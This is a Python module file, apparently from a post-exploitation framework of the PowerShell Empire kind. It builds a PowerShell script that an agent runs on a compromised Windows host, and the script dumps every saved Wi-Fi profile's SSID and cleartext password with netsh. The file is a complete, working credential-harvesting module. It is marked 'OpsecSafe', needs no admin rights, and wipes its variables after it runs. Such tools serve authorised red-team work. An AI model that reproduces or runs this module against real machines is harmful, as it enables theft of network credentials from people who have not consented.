from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Extract-WiFi',

            'Author': ['greg foss'],

            'Description': ('Extracts the host\'s saved Wireless Credentaials'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://gist.github.com/gfoss/c6a594d868d7a3efbc21b582aef32c3c'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        script = """
function Extract-Wifi {

    [CmdLetBinding()]
    param( [string]$network )

    $networks = netsh.exe wlan show profiles key=clear | findstr "All"
    $networkNames = $networks.Split(":") | findstr -v "All"
    $networkNames = $networkNames.Trim()

    Write-Output ""
    Write-Output "Wireless Networks and Passwords"
    Write-Output ""
    Write-Output "SSID : Password"
    
    $result = New-Object -TypeName PSObject

    foreach ( $ap in $networkNames ) {
        
        try {
        
            $password = netsh.exe wlan show profiles name=$ap key=clear | findstr "Key" | findstr -v "Index"
            $passwordDetail = @($password.Split(":") | findstr -v "Key").Trim()
            Write-Output "$ap : $passwordDetail"
        } catch {
            Write-Output "Unable to obtain password for $ap - Likely using 802.1x or Open Network"
        }
    }
    Get-Variable | Remove-Variable -EA 0
}
Extract-Wifi """
   
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " \"" + str(values['Value'].strip("\"")) + "\""

        return script
